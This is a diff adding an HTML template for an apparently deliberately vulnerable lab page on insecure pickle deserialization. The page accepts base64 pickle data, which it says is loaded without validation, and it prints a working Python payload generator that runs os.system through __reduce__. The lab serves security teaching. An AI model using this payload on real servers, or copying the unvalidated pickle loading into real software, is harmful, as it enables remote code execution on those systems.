@@ -1,0 +1,59 @@
+{% extends "base.html" %}
+
+{% block title %}Deserializer{% endblock %}
+
+{% block content %}
+<div class="container" style="max-width: 700px;">
+    <div class="card">
+        <div class="card-header">
+            <div class="card-icon purple">🔮</div>
+            <div>
+                <h2>Pickle Deserializer</h2>
+                <span class="vuln-tag cmd">Insecure Deserialization (RCE)</span>
+            </div>
+        </div>
+        
+        <form method="POST">
+            <div class="form-group">
+                <label for="data">Base64 Encoded Pickle Data</label>
+                <textarea id="data" name="data" placeholder="Enter base64-encoded pickle data..."></textarea>
+            </div>
+            <button type="submit" class="btn btn-primary">Deserialize →</button>
+        </form>
+        
+        <div class="hint" style="margin-top: 1rem;">
+            This accepts pickle data and deserializes it without validation.<br>
+            A malicious pickle payload can execute arbitrary code on the server.
+        </div>
+        
+        <div style="margin-top: 1.5rem; padding: 1rem; background: var(--bg-dark); border-radius: 10px;">
+            <h4 style="color: var(--accent-orange); margin-bottom: 0.5rem;">⚡ Generate Malicious Payload</h4>
+            <p style="font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 1rem;">
+                Run this Python code to generate an RCE payload:
+            </p>
+            <div class="code-block">
+                <pre>import pickle
+import base64
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+payload = base64.b64encode(pickle.dumps(Exploit()))
+print(payload.decode())</pre>
+            </div>
+        </div>
+    </div>
+    
+    {% if result %}
+    <div class="card">
+        <h3 style="margin-bottom: 1rem;">📤 Result</h3>
+        <div class="code-block">
+            <pre style="white-space: pre-wrap; word-break: break-all;">{{ result }}</pre>
+        </div>
+    </div>
+    {% endif %}
+</div>
+{% endblock %}
+
